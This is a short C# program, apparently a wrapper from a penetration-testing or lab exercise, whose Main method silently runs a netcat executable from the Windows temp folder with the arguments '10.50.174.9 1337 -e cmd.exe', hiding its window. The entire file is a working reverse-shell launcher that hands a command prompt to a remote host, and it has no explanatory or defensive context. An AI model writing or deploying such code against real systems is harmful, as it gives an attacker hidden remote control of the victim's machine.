using System;
using System.Diagnostics;

namespace Wrapper{
  class Program{
    static void Main(){
      Process proc = new Process();
      ProcessStartInfo procInfo = new ProcessStartInfo("C:\\Windows\\temp\\nc-chocola.exe", "10.50.174.9 1337 -e cmd.exe");
      procInfo.CreateNoWindow = true;
      proc.StartInfo = procInfo;
      proc.Start();
    }
  }
}
